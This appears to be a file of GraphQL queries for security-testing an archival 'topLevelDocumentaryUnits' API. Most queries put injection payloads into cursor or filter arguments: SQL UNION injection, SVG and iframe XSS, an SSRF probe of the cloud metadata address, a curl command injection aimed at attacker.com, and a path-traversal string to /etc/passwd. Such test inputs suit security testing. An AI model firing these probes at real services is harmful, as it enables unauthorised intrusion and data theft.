query topLevelDocumentaryUnits {
  topLevelDocumentaryUnits(first: 10, after: "cj1pbnRlcm5hbC1kZXNj") {
    items {
      id
      type
      identifier
      repository {
        id
        name
      }
      descriptions {
        name
        languageCode
      }
    }
    pageInfo {
      hasNextPage
      nextPage
    }
  }
}

query {
  topLevelDocumentaryUnits(after: "1' UNION SELECT * FROM documentary_units--", first: 100) {
    items {
      id
      otherIdentifiers
      description {
        archivalHistory
      }
    }
  }
}

query {
  topLevelDocumentaryUnits(from: "<svg onload=alert(1)>", first: 5) {
    items {
      identifier
      descriptions {
        name
        scopeAndContent
      }
    }
  }
}

query {
  topLevelDocumentaryUnits(from: "http://169.254.169.254/latest/meta-data/", first: 1) {
    items {
      physicalLocation
      links {
        webpage
      }
    }
  }
}

query {
  topLevelDocumentaryUnits(after: ";curl${IFS}attacker.com", first: 10) {
    items {
      systemEvents {
        logMessage
      }
    }
  }
}

query {
  topLevelDocumentaryUnits(from: "../../../../etc/passwd", first: 5) {
    items {
      findingAids
      locationOfCopies
    }
  }
}

query {
  topLevelDocumentaryUnits(after: "<iframe src=javascript:alert(document.domain)>", first: 5) {
    items {
      description {
        publicationNote
      }
    }
  }
}

query {
  topLevelDocumentaryUnits(first: 100) {
    items {
      id
      description {
        scopeAndContent
        findingAids
      }
      repository {
        latitude
        longitude
      }
    }
  }
}

query {
  s: topLevelDocumentaryUnits(first: 100) {
    i: items {
      x: id
      d: description {
        sc: scopeAndContent
      }
      r: repository {
        c: country {
          n: name
        }
      }
    }
  }
}

query {
  topLevelDocumentaryUnits {
    queryType {
      name
    }
    types {
      name
      fields {
        name
        type {
          name
          kind
        }
      }
    }
  }
}

query {
  topLevelDocumentaryUnits(name: "DocumentaryUnit") {
    name
    fields {
      name
      type {
        name
        kind
      }
    }
  }
}
